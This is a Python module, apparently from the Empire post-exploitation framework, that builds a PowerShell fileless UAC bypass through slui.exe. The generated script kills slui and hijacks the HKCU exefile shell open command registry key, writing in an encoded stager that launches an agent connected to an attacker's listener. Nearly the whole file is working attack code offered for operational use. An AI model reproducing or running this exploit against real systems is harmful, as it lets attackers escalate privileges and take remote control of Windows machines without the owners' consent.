from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-slui_uacbypass',

            'Author': ['@bofheaded','Bytecode-77'],

            'Description': ("Makes an attempt to do fileless UAC bypass via slui.exe"),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        listenerName = self.options['Listener']['Value']
        agentme = self.options['Agent']['Value']
        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
        script = """

$r = Test-Path "HKCU:\\Software\\Classes"
"{slui.exe Fileless UAC bypass}"
"=============================="
""
"--Discovered By     : Bytecode-77"
"--Powershell POC by : @bofheaded"
""
"[+] Stopping suli.exe if running"
Get-Process slui -ErrorAction SilentlyContinue | kill -PassThru | Out-Null

IF ($r -eq "True")
{
    "[+] Registry might hijack.. "
    "[+] Hijacking Registry.."
    $t=REG ADD HKCU\Software\Classes\exefile\shell\open\command /ve /t REG_SZ /d " """+launcher+""" " /f
    IF($t -eq "The operation completed successfully.")
    {
        "[+] Registry Hijacked : HKCU:\\Software\\Classes\\exefile\\shell\\open\\command"
    #   "[+] Restarting suli.exe"
    #   C:\\Windows\\system32\slui | Out-Null
    #   Start-Sleep -s 5
    #   "[+] Deleting Hijacked Registry avoiding interruption"
    #   Remove-Item -Path HKCU:\\Software\\Classes\\exefile\\shell\\open\\command
        "[+] All SET!!"
        ""

    }
    ELSE{
        "[-] Something Went Wrong"
    }
}

ELSE
{
    "[-] System Doesn't Seems Vulnerable, Aborting"
}"""
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""
        elif agentme == "":
            print helpers.color("[-] Agent option not filled, Aborting")
            return ""
        else :
            return script
